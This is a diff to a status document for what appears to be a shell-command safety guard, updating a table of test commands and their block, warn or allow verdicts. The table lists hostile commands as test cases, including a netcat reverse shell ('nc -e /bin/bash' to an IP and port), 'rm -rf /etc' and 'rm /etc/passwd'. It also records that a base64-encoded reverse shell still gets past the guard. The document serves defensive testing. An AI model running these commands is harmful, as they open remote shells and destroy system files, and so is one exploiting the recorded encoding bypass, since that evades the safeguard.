@@ -54,17 +54,22 @@ When a stage fixes a `known_issue`:
 From that point the corrected behavior is itself a locked invariant, so a later stage
 cannot reintroduce the bug.
 
-## Known issues pinned at Stage 0
+## Known-issue status
 
-| id | command | now | target | stage |
+Stage 1 fixed and promoted the following to locked invariants. ki07 remains the
+only open known issue (scheduled for Stage 2).
+
+| id | command | Stage 0 | now | status |
 | --- | --- | --- | --- | --- |
-| ki01 | `rm -rf node_modules` | block | allow | 1 |
-| ki02 | `rm -rf ./build` | block | allow | 1 |
-| ki03 | `rm -rf /tmp/mycache` | block | caution | 1 |
-| ki04 | `ls -la ~/.ssh/authorized_keys` | warn | allow | 1 |
-| ki05 | `cat notes.environment` | warn | allow | 1 |
-| ki06 | `stat deploy.env.example` | warn | allow | 1 |
-| ki07 | base64-encoded reverse shell | allow | block | 2 |
-| ki08 | `nc -e /bin/bash 10.0.0.1 4444` | allow | block | 1 |
+| ki01 -> la11 | `rm -rf node_modules` | block | allow | fixed (Stage 1) |
+| ki02 -> la12 | `rm -rf ./build` | block | allow | fixed (Stage 1) |
+| ki03 -> lw01 | `rm -rf /tmp/mycache` | block | warn | fixed (Stage 1) |
+| ki04 -> la13 | `ls -la ~/.ssh/authorized_keys` | warn | allow | fixed (Stage 1) |
+| ki05 -> la14 | `cat notes.environment` | warn | allow | fixed (Stage 1) |
+| ki06 -> la15 | `stat deploy.env.example` | warn | allow | fixed (Stage 1) |
+| ki08 -> lb12 | `nc -e /bin/bash 10.0.0.1 4444` | allow | block | fixed (Stage 1) |
+| ki07 | base64-encoded reverse shell | allow | allow | **open — Stage 2** |
 
-ki03, ki07, and ki08 were surfaced *during* Stage 0 baselining.
+New locked cases added while fixing the above: lb13 (`rm -rf /etc`), lb14
+(`rm /etc/passwd`), and lw02 (`cat .env` still warns).
+
